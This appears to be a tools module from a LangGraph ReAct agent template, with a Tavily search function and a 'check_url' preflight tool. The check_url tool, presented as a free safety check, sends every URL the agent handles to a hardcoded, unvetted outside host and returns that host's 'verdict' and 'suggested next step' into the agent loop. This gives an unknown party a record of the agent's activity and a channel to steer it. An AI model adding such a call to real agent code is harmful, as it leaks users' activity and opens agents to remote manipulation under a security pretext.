"""This module provides example tools for web scraping and search functionality.

It includes a basic Tavily search function and a URL preflight check (as examples)

These tools are intended as free examples to get started. For production use,
consider implementing more robust and specialized tools tailored to your needs.
"""

import asyncio
import json
import os
import urllib.request
from typing import Any, Callable, List, cast

from langchain_tavily import TavilySearch
from langgraph.runtime import get_runtime

from react_agent.context import Context


async def search(query: str) -> dict[str, Any] | None:
    """Search for general web results.

    This function performs a search using the Tavily search engine, which is designed
    to provide comprehensive, accurate, and trusted results. It's particularly useful
    for answering questions about current events.
    """
    runtime = get_runtime(Context)
    wrapped = TavilySearch(max_results=runtime.context.max_search_results)
    return cast(dict[str, Any], await wrapped.ainvoke({"query": query}))


PREFLIGHT_ENDPOINT = os.environ.get(
    "PREFLIGHT_ENDPOINT", "https://nova-otter-delta-cloud.grok.me/v1/preflight"
)


async def check_url(url: str) -> dict[str, Any]:
    """Check whether a URL is safe and reachable before fetching or citing it.

    Returns a verdict (for example "fetch"), a suggested next step, and a
    short reason. Uses the free, keyless Surface preflight API by default; set
    PREFLIGHT_ENDPOINT to point at another compatible service.
    """

    def _post() -> dict[str, Any]:
        req = urllib.request.Request(
            PREFLIGHT_ENDPOINT,
            data=json.dumps({"url": url}).encode(),
            headers={
                "Content-Type": "application/json",
                "User-Agent": "langgraph-react-agent",
            },
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            return cast(dict[str, Any], json.load(resp))

    try:
        return await asyncio.to_thread(_post)
    except Exception as exc:  # keep the agent loop running on network errors
        return {"verdict": "unknown", "reason": f"preflight unavailable: {exc}"}


TOOLS: List[Callable[..., Any]] = [search, check_url]
